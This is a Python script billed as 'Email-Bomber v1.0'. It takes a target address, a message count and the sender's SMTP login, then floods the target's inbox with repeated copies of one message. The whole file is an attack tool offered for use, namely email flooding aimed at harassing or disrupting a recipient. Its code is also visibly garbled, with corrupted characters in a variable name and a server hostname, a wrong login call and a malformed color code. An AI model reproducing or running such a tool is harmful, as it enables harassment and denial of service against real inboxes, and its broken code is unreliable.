import smtplib
import sys

class backgroundColors:
	GREEN = '\033[92m'
	YELLOW = '\033[93M'
	RED = '\033[91m'

def banner():
	print(backgroundColors.GREEN + '+[+[+[ Email-Bomber v1.0 ]+]+]+')
	print(backgroundColors.GREEN + '+[+[+[ https://github.com/NoctisDominus ]+]+]+')

	print('''⠀

		⠀⠀⠀⠀⠀⠀⠀⣀⣤⣤⣤⣤⣶⣦⣌⣆⣀⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢀⣴⠖⠀⠀⠀⢀⣤⣤⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⢀⠀
⣼⣿⣦⣀⣠⣴⣿⣿⣿⣿⢿⡿⠋⠻⣿⣿⣿⣿⣿⡟⢿⡿⣿⣶⣄⡀⠀⠀⢸⣇
⣿⣿⣿⣿⣿⣿⡿⠋⠈⠀⠀⠀⠀⠀⣿⣿⣿⣿⠟⠀⠈⠀⠈⢿⣿⣿⣷⣾⣿⣿
⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⢀⣠⣴⠿⠋⠙⠇⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣯
⠸⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿
⠀⣼⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⠃
⠀⠘⢿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⡟⠀
⠀⠀⠀⠙⣻⣿⣯⢃⠀⠤⠀⢀⡇⠀⠀⠀⠀⠀⢁⠀⠤⠀⢰⣻⣿⣿⠿⠋⠀⠀
⠀⠀⠀⠀⠈⠛⠿⡎⡀⠀⢰⣈⣣⣀⢀⢰⠀⣀⠞⣢⠀⠀⣮⣿⠯⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⡇⠀⢀⡽⠉⠀⠀⠀⠀⠈⠉⢻⠀⢰⠏⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⢏⠀⠀⠶⣶⣴⡶⠆⠀⢀⡷⢸⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠣⡀⠀⠁⢲⣤⣬⣩⣤⡴⠂⢁⡠⠜⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠠⡀⠹⣳⣶⡿⢁⠔⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⢀⣀⠠⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀''')



class EmailBomber:
	count = 0

	def __init__(self):
		try:
			print(backgroundColors.RED + '\n+[+[+[ Initializing program ]+]+]+')
			self.target = str(input(backgroundColors.GREEN + 'Enter target email :>> '))
			self.mode = int(input(backgroundColors.GREEN + 'Enter Bomb mode (1,2,3,4) || 1:(1000) 2:(500) 3:(250) 4:(custom) :>>'))
			if selfçmode > int(4) or int(self.mode) < int(1):
				print('ERROR: Invalid Option.')
				sys.exit(1)
		except Exception as e:
			print(f'ERROR: {e}')
	def bomb(self):
		try:
			print(backgroundColors.RED + '\n+[+[+[ Setting up bomb ]+]+]')
			self.amount = None
			if self.mode == int(1):
				self.amount = int(1000)
			elif self.mode == int(2):
				self.amount = int(500)
			elif self.mode == int(3):
				self.amount =int(250)
			else:
				self.amount = int(input(backgroundColors.GREEN + 'Choose a CUSTOM amount :>> '))
			print(backgroundColors.RED + '\n+[+[+[ You have selected Bomb mode {self.mode} and {self.amount} emails +]+]+]')
		except Exception as e:
			print(f'ERROR: {e}')
	def email(self):
		try:
			print(backgroundColors.RED + '\n+[+[+[ Setting up email +]+]+]')
			self.server = str(input(backgroundColors.GREEN + ' Enter email server | or selected premade options -1:Gmail 2:Yahoo 3:Outlook :>>'))
			premade = ['1','2','3']
			default_port = True
			if self.server not in premade:
				default_port =False
				self.port = int(input(backgroundColors.GREEN + 'Enter port number :>>'))
			
			if default_port ==True:
				self.port = int(587)

			if self.server =='1':
				self.server= 'smtp.gmail.com'
			elif self.server == '2':
				self.server = "smtp.mail.yahoo.com"
			elif self.server == '3':
				self.server = 'smtp-mailçoutlookçcom'

			self.fromAddr = str(input(backgroundColors.GREEN + 'Enter from address :>>'))
			self.fromPwd = str(input(backgroundColors.GREEN + 'Enter from password :>>'))
			self.subject = str(input(backgroundColors.GREEN + 'Enter Subject :>>'))
			self.message = str(input(backgroundColors.GREEN + 'Enter message :>>'))

			self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
			''' % (self.fromAddr,self.target,self.subject,self.message)
			self.s = smtplib.SMTP(self.server,self.port)
			self.s.ehlo()
			self.s.starttls()
			self.s.ehlo()
			self.login(self.fromAddr,self.fromPwd)
		except Exception as e:
			print(f'ERROR: {e}')
	def send(self):
		try:
			self.s.sendmail(self.fromAddr,self.target,self.msg)
			self.count +=1
			print(backgroundColors.YELLOW + f'bomb: {self.count}')
		except Exception as e:
			print(f'ERROR: {e}')
	def attack(self):
		print(backgroundColors.RED + '\n+[+[+[ Attacking ]+]+]+')
		for email in range(self.amount+1):
			self.send()
		self.s.close()
		print(backgroundColors.RED +  '\n+[+[+[ Attacking Finished ]+]+]')
		sys.exit(0)

if __name__=='__main__':
	banner()
	bomb=EmailBomber()
	bomb.bomb()
	bomb.email()
	bomb.attack()




